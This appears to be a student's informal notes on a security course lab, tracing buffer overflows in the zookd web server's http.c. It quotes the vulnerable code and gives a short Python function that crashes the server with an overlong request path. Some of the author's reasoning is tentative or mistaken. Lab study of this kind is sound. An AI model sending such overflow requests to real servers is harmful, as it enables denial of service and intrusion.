took me long time to figure out, what I need to do is to find buffer overflow in `http.c` file...I thought I might die in `gdb -p $(pgrep zookd-exstack)`...

PART1: Finding buffer overflows

①

from `zookd.c` file
```
static void process_client(int fd)
{
    char reqpath[2048];
    ...
    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
    ...
}
```

in `http.c` function `http_request_line`
```
const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
{
    static char buf[8192]; 
    ...
    sp1 = strchr(buf, ' ');
    ...
    /* decode URL escape sequences in the requested path into reqpath */
    url_decode(reqpath, sp1);
}

```
So, we can set the input reqpath longer than 2048, this will crash the server

```
def build_exploit(shellcode):
    reqpath = "/" + "a"*3000
    req = "GET " + reqpath + "HTTP/1.0\r\n" + "\r\n"
    return req
```

An interesting I found in the same time is, if I set the `reqpath = "/" + "a" * 1024` this seems normal nothing bad return even no path error return

②
still in function `http_request_line`
```
const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
{
    ...
    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
}
```

in `zookfs.c`[line:47]
```
http_serve(sockfd, getenv("REQUEST_URI"));
```

back to `http.c`
```
void http_serve(int fd, const char *name)
{
    char pn[1024];
    ...
    strcat(pn, name);
    ...
    handler(fd, pn);
}
```

so this handler can be `http_serve_executable` or `http_serve_directory` or `http_serve_file`

and hmm set reqpath to something over length 1024 seems some bad things will happend, but I still not get this, as nothing happened...

③
http.c:91
`if (strcmp(buf, "GET") && strcmp(buf, "POST"))`
I think this strcmp should be a exploit
